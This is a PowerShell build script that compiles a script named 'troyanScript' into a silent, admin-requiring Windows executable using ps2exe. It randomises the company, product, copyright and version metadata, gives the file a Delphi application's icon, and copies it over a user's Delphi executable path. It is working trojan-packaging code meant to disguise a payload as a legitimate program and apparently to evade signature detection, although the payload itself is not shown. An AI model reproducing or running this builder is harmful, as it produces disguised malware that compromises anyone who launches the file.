param (
    [string]$serverName
)
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../sys/current.ps1") -serverName $serverName
Set-Location -Path $scriptDir

function Get-RandomString {
    -join ((97..122) | Get-Random -Count 10 | ForEach-Object { [char]$_ })
}

function Remove-FileIfExists {
    param ([string]$filePath)
    if (Test-Path $filePath) {
        Remove-Item $filePath
    }
}

function Get-RandomVersion {
    "$((1..9 | Get-Random)).$((1..9 | Get-Random)).$((1..9 | Get-Random)).$((1..9 | Get-Random))"
}

if (-not (Test-Path -Path $server.userDelphiIco))
{
    Copy-Item -Path $server.defaultIco -Destination $server.troyanDelphiIco -Force
} else {
    Copy-Item -Path $server.userDelphiIco -Destination $server.troyanDelphiIco -Force
}

Remove-FileIfExists -filePath $server.troyanExe
Remove-FileIfExists -filePath $server.userDelphiExe

Invoke-ps2exe `
    -inputFile $server.troyanScript `
    -outputFile $server.troyanExe `
    -iconFile $server.troyanDelphiIco `
    -STA -x86 -UNICODEEncoding -requireAdmin -noOutput -noError -noConsole `
    -company (Get-RandomString) `
    -product (Get-RandomString) `
    -title (Get-RandomString) `
    -copyright (Get-RandomString) `
    -trademark (Get-RandomString) `
    -version (Get-RandomVersion)

Copy-Item -Path $server.troyanDelphiIco -Destination $server.userDelphiIco -Force
Copy-Item -Path $server.troyanExe -Destination $server.userDelphiExe -Force